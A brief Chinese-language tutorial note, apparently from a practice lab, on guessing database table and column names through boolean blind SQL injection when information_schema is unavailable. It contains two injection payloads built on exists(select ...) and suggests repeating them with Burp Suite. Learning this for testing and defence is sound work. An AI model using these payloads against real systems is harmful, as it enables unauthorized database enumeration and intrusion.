# 暴力破解

## 一、原理

在实际的情况中，数据库不一定存在information_schema这个表（只有mysql数据库有），或者有一定的访问限制，这是我们就需要，对表名和字段名进行猜解，此处重复性很强，可以使用burp suite进行抓包测试

## 二、应用

可以用于一些真假的盲注+，注意组合

查询代码

```
kobe' and exists(select * from aa)#
```

查询是否有aa这个表

```
kobe' and exists(select id from users)#
```


